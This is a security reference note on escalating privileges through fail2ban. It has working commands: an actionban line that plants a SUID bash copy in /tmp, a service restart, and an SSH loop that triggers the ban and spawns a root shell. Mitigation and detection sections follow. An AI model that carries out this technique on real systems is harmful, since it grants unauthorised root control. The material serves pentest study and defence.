---
topic: fail2ban privilege escalation
tags: [linux, privesc, fail2ban, sudo, systemd]
---

# fail2ban privilege escalation

**English** | [🇪🇸 Español](fail2ban-privesc.md)

## Concept

`fail2ban` watches logs and runs an **action** when an IP exceeds the allowed failures. The action is defined in `/etc/fail2ban/action.d/*.conf`, in the `actionban` variable, and runs with the service's privileges (usually root). If a user can write to `action.d` and restart the service, a ban becomes root execution.

## When it applies

- `sudo -l` allows restarting `fail2ban`, or the service runs as root.
- The user belongs to a group that owns `action.d` or an action file.
- An active jail triggers `actionban` (for example, `sshd`).

## Requirements and conditions

1. Permission to modify `action.d` or an included `.conf`.
2. Ability to restart/reload `fail2ban` with privileges.
3. An event that causes a ban (SSH failures, HTTP, etc.).
4. Knowledge of the jail's action (`iptables-multiport`, `nftables`, etc.).

## Procedure

```bash
sudo -l
find / -group <GROUP> -writable 2>/dev/null
ls -ld /etc/fail2ban/action.d
```

Identify the jail's action:

```bash
grep -R "banaction\|actionban" /etc/fail2ban/jail.conf /etc/fail2ban/jail.local 2>/dev/null
```

Replace `actionban` with a command that creates a SUID binary:

```text
actionban = cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

Restart the service and trigger the required failures:

```bash
sudo /etc/init.d/fail2ban restart
for i in $(seq 1 6); do ssh baduser@<IP>; done
/tmp/rootbash -p
```

## Variants

- **`nftables`/`iptables` action**: the filename changes, but the principle is the same.
- **`.local` file**: if the user can write `jail.local`, they can define a custom action.
- **Reload instead of restart**: some sudo rules allow `fail2ban-client reload`; it also reloads configuration.
- **HTTP ban**: an Nginx/Apache jail can be triggered with malicious requests without touching SSH.

## Limitations

- The ban must occur; if the jail is disabled, the action never runs.
- The binary path and service user must allow the write.
- A malformed `actionban` can break `fail2ban`; test locally.
- The resulting shell keeps the euid but not necessarily the uid; `bash -p` matters.

## Mitigation

- Do not give normal users write access to `/etc/fail2ban` or restart rights.
- Use `fail2ban-client` through a restricted wrapper and validate configuration.
- Monitor the integrity of `action.d` and `jail.local`.
- Run `fail2ban` with least privilege and separate jails per service.

## Detection

- Changes to `action.d`/`jail.local` and `fail2ban` restarts outside the change window.
- SUID binaries appearing in `/tmp`, `/var/tmp` or `/dev/shm`.
- Bursts of authentication failures from one IP right after a configuration change.
- `auditd` on `action.d` and on `execve` of `cp`/`chmod` by the service user.

MITRE ATT&CK: T1548.001 (Setuid and Setgid), T1543.002 (Systemd Service), T1562.001 (Impair Defenses).

## References

- <https://github.com/fail2ban/fail2ban/wiki>
- <https://manpages.debian.org/bookworm/fail2ban/fail2ban.conf.5.en.html>
- <https://attack.mitre.org/techniques/T1548/001/>
